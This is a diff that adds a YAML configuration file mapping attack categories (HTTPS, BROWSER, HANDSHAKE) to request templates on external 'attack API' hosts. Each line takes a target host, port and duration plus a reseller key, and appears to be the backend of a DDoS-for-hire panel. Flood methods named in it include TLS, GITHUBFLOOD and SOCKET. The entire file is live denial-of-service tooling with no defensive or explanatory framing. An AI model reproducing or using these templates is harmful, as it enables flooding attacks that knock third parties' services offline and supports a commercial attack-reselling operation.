@@ -1,0 +1,12 @@
+methods:
+  HTTPS:
+    - https://trashyassapi.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=TLS
+    - https://trashyassapi1.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=MEGAHTTPSKILLAV9
+    - https://trashyassapi2.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=GET
+  BROWSER:
+    - https://trashyassapi.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=BROWSAV99
+    - https://trashyassapi1.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=GITHUBFLOOD
+  HANDSHAKE:
+    - https://trashyassapi.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=TCP
+    - https://trashyassapi1.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=SOCKET
+    - https://trashyassapi2.net/api/attack?key=imreselling&host=<<host>>&port=<<port>>&time=<<time>>&method=HANDSHAKE
